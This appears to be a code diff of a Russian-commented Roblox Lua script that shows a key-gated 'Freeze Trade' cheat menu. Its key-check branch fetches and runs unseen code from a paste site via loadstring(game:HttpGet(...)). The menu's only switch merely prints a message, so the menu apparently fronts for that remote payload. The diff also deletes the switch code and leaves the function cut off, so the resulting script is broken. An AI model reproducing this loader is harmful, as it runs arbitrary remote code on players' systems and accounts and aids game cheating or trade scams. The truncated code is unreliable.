@@ -82,9 +82,9 @@ KeyBtn.MouseButton1Click:Connect(function()
         loadstring(game:HttpGet("https://cdn.sourceb.in/bins/cCS4jW4Mph/0"))()
         
         -- ============================================================
-        -- 2. ЗАГРУЗКА 2 МИНУТЫ
+        -- 2. ОСНОВНАЯ ЗАГРУЗКА И МЕНЮ
         -- ============================================================
-        LoadMainScript()
+        StartLoaderAndMenu()
     else
         KeyStatus.Text = "❌ Неверный ключ. Попробуйте снова."
         KeyStatus.TextColor3 = Color3.fromRGB(255, 0, 0)
@@ -104,9 +104,9 @@ TweenService:Create(KeyBtn, TweenInfo.new(0.5), {BackgroundTransparency = 0}):Pl
 TweenService:Create(KeyStatus, TweenInfo.new(0.5), {TextTransparency = 0}):Play()
 
 -- ============================================================
--- 3. МЕНЮ И ЗАГРУЗКА
+-- 3. ЗАГРУЗКА И МЕНЮ
 -- ============================================================
-function LoadMainScript()
+function StartLoaderAndMenu()
     local TweenService = game:GetService("TweenService")
     local playerGui = LocalPlayer:WaitForChild("PlayerGui")
     
@@ -186,7 +186,7 @@ function LoadMainScript()
         LoaderGui:Destroy()
         
         -- ============================================================
-        -- 4. МЕНЮ (FREEZE TRADE)
+        -- 4. МЕНЮ (FREEZE TRADE) - ТЕПЕРЬ ТОЧНО ПОЯВИТСЯ
         -- ============================================================
         local MenuGui = Instance.new("ScreenGui")
         MenuGui.Name = "FreezeTradeMenu"
@@ -218,33 +218,4 @@ function LoadMainScript()
             local c = Instance.new("Frame")
             c.Parent = parent
             c.Size = UDim2.new(1, -30, 0, 50)
-            c.Position = UDim2.new(0, 15, 0, yPos)
-            c.BackgroundTransparency = 1
-            local l = Instance.new("TextLabel")
-            l.Parent = c; l.Size = UDim2.new(0, 150, 1, 0); l.BackgroundTransparency = 1
-            l.Text = label; l.TextColor3 = Color3.fromRGB(220,220,220); l.TextSize = 13; l.Font = Enum.Font.Gotham; l.TextXAlignment = Enum.TextXAlignment.Left
-            local bg = Instance.new("Frame")
-            bg.Parent = c; bg.Size = UDim2.new(0, 50, 0, 28); bg.Position = UDim2.new(1, -50, 0.5, -14)
-            bg.BackgroundColor3 = Color3.fromRGB(60,60,60); local bgc = Instance.new("UICorner"); bgc.Parent = bg; bgc.CornerRadius = UDim.new(1,0)
-            local knob = Instance.new("Frame")
-            knob.Parent = bg; knob.Size = UDim2.new(0, 22, 0, 22); knob.Position = UDim2.new(0, 3, 0.5, -11)
-            knob.BackgroundColor3 = Color3.fromRGB(255,255,255); local kc = Instance.new("UICorner"); kc.Parent = knob; kc.CornerRadius = UDim.new(1,0)
-            local isOn = false
-            local d = Instance.new("TextButton"); d.Parent = c; d.Size = UDim2.new(1,0,1,0); d.BackgroundTransparency = 1; d.Text = ""
-            d.MouseButton1Click:Connect(function()
-                isOn = not isOn
-                local target = isOn and Color3.fromRGB(255,70,70) or Color3.fromRGB(60,60,60)
-                local pos = isOn and UDim2.new(1, -25, 0.5, -11) or UDim2.new(0, 3, 0.5, -11)
-                TweenService:Create(bg, TweenInfo.new(0.15), {BackgroundColor3 = target}):Play()
-                TweenService:Create(knob, TweenInfo.new(0.15), {Position = pos}):Play()
-                if cb then cb(isOn) end
-            end)
-        end
-
-        createSwitch(MFrame, 60, "Freeze", function(state)
-            print("Freeze " .. (state and "включён" or "выключен"))
-        end)
-
-        print("Меню загружено.")
-    end)
-end
+           
